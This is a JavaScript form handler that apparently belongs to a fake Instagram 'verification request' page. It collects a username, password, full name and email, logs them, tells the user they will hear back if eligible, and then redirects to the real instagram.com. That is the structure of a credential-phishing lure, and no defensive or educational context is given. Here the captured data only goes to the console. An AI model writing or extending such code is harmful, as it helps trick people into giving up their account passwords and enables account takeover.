
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const fullname = document.getElementById("fullname").value;
  const email = document.getElementById("email").value;
  console.log("Verification Request Submitted:");
  console.log("Username:", username);
  console.log("Password:", password);
  console.log("Full Name:", fullname);
  console.log("Email:", email);
  alert("Your verification request has been submitted. You will receive an email if you're eligible.");
  window.location.href = "https://www.instagram.com";
});
